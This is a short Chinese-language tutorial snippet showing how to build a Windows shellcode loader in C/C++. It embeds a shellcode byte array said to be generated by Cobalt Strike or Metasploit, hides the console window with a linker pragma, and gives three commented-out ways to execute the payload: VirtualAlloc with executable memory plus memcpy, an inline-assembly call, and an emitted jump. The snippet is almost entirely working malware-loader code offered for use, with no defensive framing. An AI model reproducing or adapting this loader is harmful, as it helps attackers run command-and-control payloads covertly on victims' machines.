## **原生案例**
c/c++做加载器。
cs或msf生成c语言的shellcode数组。
```
#include <Windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"") //windows关闭黑窗口


unsigned char buf[] =
"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
...
"\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";



int main()

{
    
	//((void(WINAPI*)(void))&buf)();
	
    //第一种加载器
	//char* Memory;
    //Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    //memcpy(Memory, buf, sizeof(buf));
    //((void(*)())Memory)();

    //第二种加载器
    //__asm {
    //lea eax,buf
    //call eax
    //}
	
    //第三种加载器
	//__asm{
	//mov eax, offset shellcode
	//_emit 0xFF
	//_emit 0xE0
	//}

}
```
编译连接成exe即可。